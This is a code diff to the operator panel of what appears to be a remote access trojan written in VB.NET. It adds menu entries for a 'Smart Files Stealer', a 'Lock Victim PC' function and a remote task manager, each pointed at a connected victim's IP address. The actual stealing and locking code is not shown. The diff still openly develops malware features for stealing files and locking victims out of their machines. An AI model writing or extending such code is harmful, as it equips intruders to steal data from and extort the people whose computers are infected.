@@ -200,7 +200,21 @@ Public Class RatPanel
         form.targetIp = connectedClientsView.CurrentCell.Value.ToString
         form.Show()
     End Sub
-
+    Private Sub SmartFilesStealerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SmartFilesStealerToolStripMenuItem.Click
+        Dim form As New SmartFiles()
+        form.targetIp = connectedClientsView.CurrentCell.Value.ToString
+        form.Show()
+    End Sub
+    Private Sub LockVictimPCToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LockVictimPCToolStripMenuItem.Click
+        Dim form As New LockPC()
+        form.targetIp = connectedClientsView.CurrentCell.Value.ToString
+        form.Show()
+    End Sub
+    Private Sub TaskManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TaskManagerToolStripMenuItem.Click
+        Dim form As New TaskMgr()
+        form.targetIp = connectedClientsView.CurrentCell.Value.ToString
+        form.Show()
+    End Sub
 #End Region
 #Region "UnspecificEvents"
     Private Sub BuildButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BuildButton.Click
@@ -242,9 +256,10 @@ Public Class RatPanel
         If Button1.Text = "EDIT" Then Button1.Text = "SAVE" : TextBox1.Enabled = True Else Button1.Text = "EDIT" : TextBox1.Enabled = False
     End Sub
 
-    Private Sub LockVictimToolStripMenuItem_Click(sender As Object, e As EventArgs)
 
-    End Sub
+
+
+
 
 #End Region
 End Class
